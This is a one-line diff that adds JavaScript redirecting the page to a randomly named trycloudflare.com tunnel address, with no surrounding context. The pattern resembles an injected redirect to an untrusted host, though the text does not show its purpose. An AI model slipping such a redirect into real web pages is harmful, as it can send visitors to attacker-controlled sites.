@@ -1,0 +1,1 @@
+window.location.href = "https://thereby-accurate-suburban-trick.trycloudflare.com";
